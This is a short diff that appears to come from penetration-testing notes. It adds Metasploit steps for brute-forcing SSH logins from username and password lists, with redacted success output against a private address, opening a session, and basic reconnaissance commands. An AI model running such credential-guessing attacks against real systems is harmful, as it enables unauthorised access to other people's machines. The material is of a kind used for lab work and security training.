@@ -26,3 +26,19 @@ set STOP_ON_SUCCESS true
 
 set USER_FILE /path/to/username_list.txt
 set PASS_FILE /path/to/password_list.txt
+
+
+show options
+run
+[+] 192.168.1.119:22 - Success: '<REDACTED_USER>:<REDACTED_PASS>' ...
+[*] SSH session <ID> opened (...)
+
+
+sessions -l
+sessions -i <ID>
+
+
+whoami
+hostname
+uname -a
+ifconfig
